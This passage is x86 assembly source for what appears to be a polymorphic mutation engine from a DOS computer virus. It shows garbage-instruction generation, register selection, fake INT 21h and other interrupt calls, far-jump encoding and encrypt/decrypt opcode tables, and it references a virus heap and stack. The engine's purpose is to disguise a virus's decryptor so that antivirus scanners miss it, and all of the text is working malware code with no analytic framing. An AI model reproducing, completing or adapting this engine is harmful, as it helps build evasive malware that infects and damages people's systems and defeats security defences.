         mov     ax, [engdata.begin_sub]     ; calculate CALL offset
pblabel sto_min_di_2
         sub     ax, di
         dec     ax
         dec     ax
    DOELSE                         ; encode CALL register
        call    choose_wr_and_encode_mov             ;al-register, cx-value
        mov     ax, [engdata.begin_sub]
        call    setup_reg          ;
        mov     ah, 0D0h           ; ax=0xD0FF now
        or      ah, cl             ;
    DONE
    stosw
@@ret:
    ret
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ







;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel not_branch_garble                  ;
    DO                              ; get random INSTRUCTION
        call    RND_GET_BYTE        ; mostly do larger instructions normalise
        and     al, 00111110b        ; random number is it the same as before?
        cmp     al, [engdata.lastgarble]  ; then try again, since we don't want two
    CYCLE E                         ; of the same sort in a row
pblabel force_not_branch_garble
    mov     [engdata.lastgarble], al      ; else remember this one and process it
;---------------------------------------------------------------------------
    add     ax, offset garble_table  ;
    xchg    si, ax                   ;
    mov     cx, [si]                 ;
    and     cl, not 1                ;
    call    RND_GET_BYTE            ;
    and     al, ch                   ;
    and     al, 3                    ;
    or      cl, al                   ;
    lea     bx, [vir_heap._engdata.reg0]            ;
    and     ch, not MASK R_M         ; clear bottom 3 bits
    DOIF Z                          ; if mod = 0
;- encode two register instruction -- or reg und memory --------------------
;----- process M0D ---------------------------------------------------------
        call    RND_GET_BYTE        ; get random M0D
        and     al, MASK M0D         ;
        or      ch, al               ; fill in the field
        rol     al, 2                ;
        mov     dl, al               ; dl=M0D
        cmp     al, 11b              ; use two register ?
        DOIF B                      ; if use memory, i.e. [bx+si]
            and     cl, not 1        ; change to byte data "byte sized"
        DONE                        ; for not MOV AX,[0FFFFh]
;----- process Reg ---------------------------------------------------------
        call    choose_register     ;
        test    byte ptr [si], 00000100b
        DOIF NZ                     ; can we use any register as 1st ?
            call    RND_GET_THREE_BITS
        DONE                        ; yes! any! // for (test/cmp) operation
        mov     [engdata.lastchoose], al
        shl     al, REG               ; move register into the reg field
;----- process R/M ---------------------------------------------------------
        push    ax
        DO
            call    RND_GET_BYTE        ; get random R/M
            and     al, MASK R_M         ; in memory access,
            cmp     al, [engdata.lastchoose]
        CYCLE E             ;don't "mov ax,ax" etc
        or      ch, al               ;
        cmp     al, 110b             ; if (R/M = 6)
        PASS NE                     ;
        test    ch, MASK M0D           ; and MOD = 00
        DOIF E                      ;
            mov     dl, 2            ; need two byte after instruction
        DONE                        ;
;---------------------------------------------------------------------------
        cmp     ch, 0C0h
        DOIF B
            call    RND_GET_BYTE
            DOIF P
                MASKA   al,0010x110     ; 26, 2E, 36, 3E - segment prefix
                stosb         ;segcs | seges
            DONE
        DONE
        pop    ax
    DOELSE
;- encode one register instruction -------------- ! no memory ! ------------
        call    choose_register     ;
        xor     dl, dl              ; no data bytes
        test    byte ptr [si], 1    ;
        DOIF Z                      ; if shift, not, neg inctruction
            inc     dx              ; assume byte
            test    cl, 1           ; byte or word of data?
            DOIF NZ                 ; continue if so
                inc     dx          ; INC DX is better!!!
            DONE                    ;
        DONE
        cmp     si, offset enc_mov_imm
        DOIF E
            test    cl, 1
            DOIF    NE
                add     al, 8 ;word
            DONE
            add     al, 0B0h
            mov     cl, al
            jmp     less_1
        DONE
;---------------------------------------------------------------------------
        cmp     al, R_AX
        DOIF E
            test   cl, 01111110b
            DOIF Z
                and     cl, 1
                or      cl, ch
                MASKA   cl, 00xxx10x
                jmp     less_1
            DONE
            cmp     si, offset enc_test
            DOIF E
                sub     cl, 0F6h-0A8h
pblabel less_1
                call    RND_GET_BYTE
                mov     ch, al
                dec     dx
            DONE
        DONE
;- store instruction -------------------------------------------------------
    DONE                            ;
    or      ch, al                   ; 1st register
    xchg    cx, ax                   ;
    stosw                           ; write the instruction
;- store data bytes after instruction --------------------------------------
pblabel store_data_bytes_after_instruction
    and     dl, dl                   ; needs data bytes?
    DOIF NZ                         ;
        cmp     dl, 3                ; check length of instruction
        DOIF NE                     ;
            call    RND_GET_BYTE    ;
            stosb                   ; write the random byte
            dec     dl              ;
        CYCLE NZ                    ;
    DONE                            ;
    retn                            ;
;endp                    ;
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ




;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel choose_register
    call    choose_word_register
    test    cl, 1                    ; byte or word register?
    DOIF Z                          ; if word, we are okay
        cmp     al, R_SP
        DOIF AE                          ; is a SI, DI, BP,
            pop     bx
        DONE
        and     ah, 4                    ; change xL to xH
        or      al, ah                   ; make either byte or word register
    DONE
    ret
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ





;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel choose_word_register
;
; 1..3 - crypt   registers
; 4..6 - garbage registers
; 0..6 - all     registers
;                7654321
;useregs        01111111b
;                ภมมมมมมฤฤฤ"1" - possible use reg6..reg0
;                DO
pblabel doo
    mov     bl,[engdata.useregs]
    call    RND_GET_THREE_BITS            ; get random number
    clc ; CF=0
    xchg    cx,ax
    shr     bl,cl
    xchg    cx,ax
    jnc doo
    dec     ax
    lea     bx, [vir_heap._engdata.reg0]
    add     bx, ax
;ifd
    cmp     byte ptr [bx],-1
;pub
protect_reg equ byte ptr $-1
        je  doo
        cmp     al,[engdata.lastchoose]
    je  doo
    mov     [engdata.lastchoose],al
    mov     al,[bx]
    ret
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ





;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel setup_reg
    add     ax, VIRUSSTACKSIZE ;[engdata.sourceptr]
    sub     ax, [engdata.targetptr]
    stosw
pblabel not_branch_garble_with_save_cx
    push    cx
    call    not_branch_garble
    pop     cx
    mov     ax, 0E0FFh           ; encode JMP register
    ret
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ





;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel encode_push  ;bx
    DO
        push    bx
        call    choose_word_register
        pop     bx
        cmp     al,R_CX
    CYCLE BE ;te:R_AX or R_CX
    push    ax
    xchg    cx, ax
    call    encode_mov
    xchg    ax, bx
pblabel push_any_sux1
    stosw
    pop     ax
pblabel push_any_sux ;al-register for push
    add     al, opPUSH_AX           ;push sux
    stosb
    ret
    jmp     many_nonbranch_garble
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ





;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel encode_push_addr
    call    choose_word_register
    push ax
    xchg    cx,ax
    call    encode_mov
    mov     bx,di
    mov     ax, VIRUSSTACKSIZE ;[engdata.sourceptr]
    sub     ax, [engdata.targetptr]
    jmp     push_any_sux1
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ




;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel encode_far_jmp       ;cx:dx
    call    RND_GET
    DOIF P
        push    dx
        mov     bx, cx
        call    encode_push
        pop     bx
        call    encode_push
        STO_BYTE opRETF
    DOELSE
        STO_BYTE opJMPFAR
        xchg    ax, dx
        stosw
        xchg    ax, cx
        stosw
    DONE
    jmp     shit
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ




;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel choose_function
    call    rnd_get_byte
;- choose function
    and     al, 0Fh
    add     ax, offset int21func
    cmp     ax, offset cf_1
    xchg    si, ax
;- setup CF
    DOIF B
        call    choose_word_register
        xchg    cx, ax
        call    encode_zero_reg  ;encode CF=0
    DONE
;comment #
;- setup DX
;- enc   mov    dx,0..7fff
;- need for deldir, delfile, findfirst
    cmp si,offset setdx
    DOIF AE
        mov     cl, R_DX
        call    encode_mov
        call    RND_GET
        shr     ax, 1
        stosw
    DONE
;#
    test    di,ax   ;pseudo-random
;- setup reg AH
    mov     al, opMOV_AHimm ;mov ah,xx
    DOIF P
        sub     cl, cl   ;mov     cl,R_AX
        call    encode_mov  ;mov ax,xxxx
        call    RND_GET_BYTE
    DONE

    stosb
    movsb
    ret
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ



;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel int_any_reg
            db 8h, 1ch, 28h, 2Bh
            db 11h, 12h
pblabel with_setup
            db 16h, 17h
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel cpm
            db 18h,1dh,1eh,20h
pblabel int21func  ;db 10h dup (30h);function return cf=1 or no change cf
            db 51h, 62h, 30h        ;- use as cmp too
            db 19h,2ah,2ch, 36h,4dh,0dh,23h,         0bh; 54,
pblabel cf_1       ;function return cf=1                /--/--/- need setup(DX<>-1)
            ;46,
            db  5ch
pblabel setdx      ;db    5c,5c,5c
            db 3Dh, 41h,4eh,3Ah    ;4Bh, -sux
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ








;ฤ encode int 21 ฤออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel encode_int21
    mov     protect_reg, R_AX
    test    [engdata.zmeflags], MASK EN_USE_INT
    jz     unprotect_reg1
    cmp     [engdata.useregs], REG_ALL
    jne     unprotect_reg1
    call    RND_GET_BYTE
;    jz      encode_int
    DOIF Z
;ฤENCODE INTERRUPTฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
pblabel encode_int
    call    RND_GET_THREE_BITS
    test    [engdata.zmeflags], MASK EN_RELOCATOR
    DOIF Z  ;only without relocator
        call    RND_GET_THREE_BITS
;        jz      encode_cpm
        DOIF Z
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel encode_cpm
    call    encode_push_addr
    push    bx
    call    many_nonbranch_garble
    STO_BYTE opPUSH_CS          ; encode PUSH CS
    call    many_nonbranch_garble
    call    RND_GET_THREE_BITS ;push sux
    call    push_any_sux ;al-register for push
    call    many_nonbranch_garble
    mov     cl,R_CX               ;mov cx,cpmfunc
    call    encode_mov
    call    RND_GET_THREE_BITS
    add     ax, offset cpm
    xchg    si, ax
    movsb
    call    RND_GET
    stosb
    call    RND_GET_THREE_BITS
    mov     cx, ax
    mov     al, 0Ch
    sub     al, cl
    shl     al, 4
    xchg    dx, ax
    call    encode_far_jmp
    pop     bx
    add     [bx], di
pblabel unprotect_reg1
    jmp     unprotect_reg
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

        DONE
    DONE
;ฤ encode int 8, 1C, 16, 17, 11, 12, 2B, 28 ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
    cmp al, 5
    DOIF A ;need setup
        push    ax
        sto_byte opMOV_AHimm
        test    ax, di   ;pseudo-random
        sbb     ax, ax   ;-1 | 0
        inc     ax      ;
        inc     ax      ;
        stosb        ; 1 | 2
        pop     ax
    DONE
    add     ax, offset int_any_reg
    push    ax
    call    many_nonbranch_garble
    pop si
    sto_byte opINT
    movsb
pblabel unprotect_reg
    mov     protect_reg, -1
    ret
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ


    DONE
    call   RND_GET_BYTE
    DOIF Z
        call    choose_function
        sto_two_byte opINT, 21h
    DOELSE
        call RND_GET_BYTE
        mov al,6
        DOIF Z
            sub al,6-1Eh
        DONE
        stosb     ;push ds(es)
        push    ax
        call    many_nonbranch_garble
        call    choose_word_register
        xchg    cx, ax
        call    encode_mov
        call    RND_GET_THREE_BITS
        stosw
        shl     ax, 4
        mov     [engdata.segm_IDT], 84h
        sub     [engdata.segm_IDT], al
;- enc mov ds(es), reg
        sto_byte 8Eh
        pop     ax
        push    ax  ;ax=6 | 1E
        MASKA   al, 110xx000
        add     al, cl
        stosb
        call    choose_function  ;clear C before pushf
        sto_byte   opPUSHF  ;pushf
;        call    many_nonbranch_garble

        test    [engdata.zmeflags], MASK EN_RELOCATOR
        GOIN NZ ;force use call
        call    RND_GET
        DOIF Z ;use call
            pop     ax
            push    ax  ;ax=6 | 1E
            cmp     al,6
            DOIF E
                sto_byte   opSEGES ;seges
            DONE                   ;ZF=1 -> 26, ZF=0 -> EB(maybe)
            sto_two_byte 0ffh, 1Eh
            mov     al, [engdata.segm_IDT]
            xor     ah, ah
            stosw
        DOELSE ;use jmp
            sto_byte opPUSH_CS  ;push  cs
            call    encode_push_addr
            pop     ax
            push    ax  ;ax=6 | 1E
            cmp     al, 6
            DOIF E
                sto_byte   opSEGES ;seges
            DONE
            push    bx
            sto_two_byte 0ffh,  2Eh
            mov     al, [engdata.segm_IDT]
            xor     ah, ah
            stosw
            call    shit
            pop     bx
            add     [bx],di
        DONE
        pop     ax
        inc     ax
        stosb
    DONE
;ฤฤ encode test CF after int21 ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
    call    RND_GET_BYTE
    DOIF NZ
;        jz      @@ret ;maybe :)
        mov     al, opJC
        adc     al, 0
        stosb
        cmp     si, offset cf_1
        DOIF A ;if instruct > 0A ->  73<=>72
            dec   ax
        DONE
        cmp     al, opJC
        DOIF NE ;73(jnc)
            call    RND_GET_THREE_BITS
            inc     ax  ;al=1..8
            stosb       ;over shit
            call    shit_ax
        DOELSE ;72(jc)
            call    RND_GET_BYTE  ; to shit
            stosb
        DONE
    DONE
pblabel unprotect_reg2
    jmp unprotect_reg
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ







;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; high byte holds the opcode, low byte holds the second byte of the
; instruction, i.e. holds the reg/mod, etc. the bottom 2 bits of the low
; byte hold the maximum amount to add to the high byte in creating the
; instruction. This allows one word to generate more than one instruction,
; including the byte or word forms of the instructions
; note that this is reverse of what will be actually stored
;----------------------------------------------------------------------------
ONEHALF = 0
TWOHALF = 1     ;USE _ANY_ REGISTER FOR THIS OPERATION
BINOP = 0       ;TWO ARGUMENT OPERATION
UNEOP = 1       ;ONE ARGUMENT OPERATION
ONLY_THIS_OPCODE = 00b
USE_ANY_SIZE     = 01b
INCL_NEXT_OPCODE = 11b
;----------------------------------------------------------------------------
dop             macro   highopcode, shiftneg, lowpcode, twohalf, secdlim
                  db     highopcode or shiftneg, lowpcode or ((twohalf shl 2) and 4) or secdlim
                endm
;----------------------------------------------------------------------------
pblabel garble_table                       ;for decrypt                                               -  AX  -
pblabel encrypt_opcode_table
      dop   10000000b,  BINOP,  11110000b,  ONEHALF,  USE_ANY_SIZE   ;ณ   ;  XOR reg, XXXX     0010010x
      dop   11110110b,  UNEOP,  11011000b,  ONEHALF,  USE_ANY_SIZE   ;ณ   ;  NEG reg
      dop   11010000b,  UNEOP,  11000000b,  ONEHALF,  USE_ANY_SIZE   ;ณ   ;  ROL reg, 1
                                                  ;ณ
      dop   10000000b,  BINOP,  11000000b,  ONEHALF,  USE_ANY_SIZE   ;ณฺ  ;  ADD reg, XXXX     0000010x
      dop   00000010b,  BINOP,  00000000b,  ONEHALF,  USE_ANY_SIZE   ;ณณ  ;  ADD reg, [reg]
      dop   00110010b,  BINOP,  00000000b,  ONEHALF,  USE_ANY_SIZE   ;ณณ  ;  XOR reg, [reg]
      dop   00101010b,  BINOP,  00000000b,  ONEHALF,  USE_ANY_SIZE   ;ณณ  ;  SUB reg, [reg]
      dop   10000000b,  BINOP,  11101000b,  ONEHALF,  USE_ANY_SIZE   ;ภณ  ;  SUB reg, XXXX     0010010x   (2 diff encodings)
                                                  ; ณ
      dop   11010000b,  UNEOP,  11001000b,  ONEHALF,  USE_ANY_SIZE   ; ณ  ;  ROR reg, 1
      dop   11110110b,  UNEOP,  11011000b,  ONEHALF,  USE_ANY_SIZE   ; ณ  ;  NEG reg        ;dupez
      dop   10000000b,  BINOP,  11110000b,  ONEHALF,  USE_ANY_SIZE   ; ณ  ;  XOR reg, XXXX  ;dupez 0010010x
                                                  ; for encrypt
pblabel end_encrypt_opcode_table            ;  ^---^^-simetrichno
sizeof_encrypt_opcode_table equ ($-encrypt_opcode_table)


;startup
pblabel enc_mov_imm
      dop   10110000b,  BINOP,  11000000b,  ONEHALF,  USE_ANY_SIZE   ;       ;  MOV reg, [reg]     1011x000   ;&ah
      dop   10001010b,  BINOP,  00000000b,  ONEHALF,  USE_ANY_SIZE   ;       ;  MOV reg, [reg]     1011x000   ;&ah
      dop   10001010b,  BINOP,  00000000b,  ONEHALF,  USE_ANY_SIZE   ;       ;  MOV reg, [reg]     1011x000   ;&ah
      dop   10001010b,  BINOP,  00000000b,  ONEHALF,  USE_ANY_SIZE   ;       ;  MOV reg, [reg]     1011x000   ;&ah
      dop   00001010b,  BINOP,  00000000b,  ONEHALF,  USE_ANY_SIZE   ;       ;   OR reg, [reg]
      dop   00010010b,  BINOP,  00000000b,  ONEHALF,  USE_ANY_SIZE   ;       ;  ADC reg, [reg]
      dop   00011010b,  BINOP,  00000000b,  ONEHALF,  USE_ANY_SIZE   ;       ;  SBB reg, [reg]
      dop   00100010b,  BINOP,  00000000b,  ONEHALF,  USE_ANY_SIZE;          ;  AND reg, [reg]
;      dop   00111000b,  BINOP,  00000000b,  TWOHALF,  INCL_NEXT_OPCODE   ;   ;  CMP reg, [reg] /CMP [reg], reg
      dop   00111010b,  BINOP,  00000000b,  TWOHALF,  USE_ANY_SIZE       ;   ;  CMP reg, [reg] /CMP [reg], reg
;      dop   10001010b,  BINOP,  00000000b,  ONEHALF,  USE_ANY_SIZE   ;       ;  MOV reg, [reg]     1011x000   ;&ah
;de
;      dop   10001010b,  BINOP,  00000000b,  ONEHALF,  USE_ANY_SIZE;          ;  MOV reg, [reg]
      dop   10000000b,  BINOP,  11001000b,  ONEHALF,  USE_ANY_SIZE   ;       ;   OR reg, XXXX     00_001_10x
      dop   10000000b,  BINOP,  11010000b,  ONEHALF,  USE_ANY_SIZE   ;       ;  ADC reg, XXXX     00_010_10x
      dop   10000000b,  BINOP,  11011000b,  ONEHALF,  USE_ANY_SIZE   ;       ;  SBB reg, XXXX     00_011_10x
      dop   10000000b,  BINOP,  11100000b,  ONEHALF,  USE_ANY_SIZE   ;       ;  AND reg, XXXX     00_100_10x

;      dop   10000000b,  BINOP,  11100000b,  ONEHALF,  USE_ANY_SIZE   ;       ;  AND reg, XXXX     00_100_10x
      dop   10000100b,  BINOP,  00000000b,  TWOHALF,  USE_ANY_SIZE   ;       ; TEST reg, [reg]
      dop   11010000b,  UNEOP,  11001000b,  ONEHALF,  INCL_NEXT_OPCODE   ;       ;  ROR reg, 1/CL
      dop   11010000b,  UNEOP,  11010000b,  ONEHALF,  INCL_NEXT_OPCODE   ;       ;  RCL reg, 1/CL
      dop   11010000b,  UNEOP,  11011000b,  ONEHALF,  INCL_NEXT_OPCODE   ;       ;  RCR reg, 1/CL
      dop   11010000b,  UNEOP,  11100000b,  ONEHALF,  INCL_NEXT_OPCODE   ;       ;  SHL/SAL reg, 1/CL
      dop   11010000b,  UNEOP,  11101000b,  ONEHALF,  INCL_NEXT_OPCODE   ;       ;  SHR reg, 1/CL
      dop   11010000b,  UNEOP,  11111000b,  ONEHALF,  INCL_NEXT_OPCODE   ;       ;  SAR reg, 1/CL
;      dop   11010000b,  UNEOP,  11111000b,  ONEHALF,  INCL_NEXT_OPCODE   ;       ;  SAR reg, 1/CL
      dop   11110110b,  UNEOP,  11010000b,  ONEHALF,  USE_ANY_SIZE   ;       ;  NOT reg
;                 ^^ |= (RND and            ^^)
;                                       ^ 1 -> use any register & memory
;                           ^^ = 0 possible use memory, 11- registers only
;                       ^- if 1 then not need arguments(shift, not, neg)
pblabel enc_test
      dop   11110110b,  BINOP,  11000000b,  TWOHALF,  USE_ANY_SIZE   ;       ; TEST reg, XXXX
      dop   10000000b,  BINOP,  11111000b,  TWOHALF,  USE_ANY_SIZE   ;       ;  CMP reg, XXXX     00_110_10x
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ




;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel onebyte_table
                stc                  ; |
                clc                  ; |
                cld                  ; |
                cmc                  ; |
                sahf                 ; |
pblabel onebyte_table_ax                    ; |
                cli                  ;-\
                dec     ax           ; |
                inc     ax           ;-/-\
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ|ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
                lahf                 ;   |
                daa                  ;   |
                das                  ;   |
                cbw                  ;   |
                xlat                 ;  /
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;PMtest db 050h,0B8h,086h,016h,0CDh,02Fh,023h,0C0h,058h,075h,006h,05Fh,055h,08Bh,0ECh,0FFh,0E7h
pblabel ZME_END
ends
end
